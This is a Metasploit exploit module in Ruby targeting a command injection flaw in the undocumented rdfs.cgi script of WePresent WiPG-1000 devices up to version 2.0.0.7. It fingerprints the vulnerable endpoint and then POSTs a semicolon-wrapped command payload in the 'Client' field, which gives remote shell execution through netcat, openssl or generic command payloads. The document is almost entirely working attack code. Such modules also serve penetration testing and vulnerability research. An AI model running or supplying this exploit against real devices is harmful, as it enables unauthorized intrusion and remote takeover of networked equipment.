# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WePresent WiPG-1000 Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability in an undocumented
        CGI file in several versions of the WePresent WiPG-1000 devices.
        Version 2.0.0.7 was confirmed vulnerable, 2.2.3.0 patched this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Matthias Brun&#039;, # Vulnerability Discovery, Metasploit Module
        ],
      &#039;References&#039;     =>
        [
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039;     =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic netcat openssl&#039;
            }
        },
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;WiPG-1000 <=2.0.0.7&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Apr 20 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end


  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;/cgi-bin/rdfs.cgi&#039;)
    })
    if res and res.body =~ /Follow administrator instructions to enter the complete path/ then
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status(&#039;Sending request&#039;)
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;/cgi-bin/rdfs.cgi&#039;),
      &#039;vars_post&#039; => {
        &#039;Client&#039; => ";#{payload.encoded};",
        &#039;Download&#039; => &#039;Download&#039;
      }
    )
  end

end

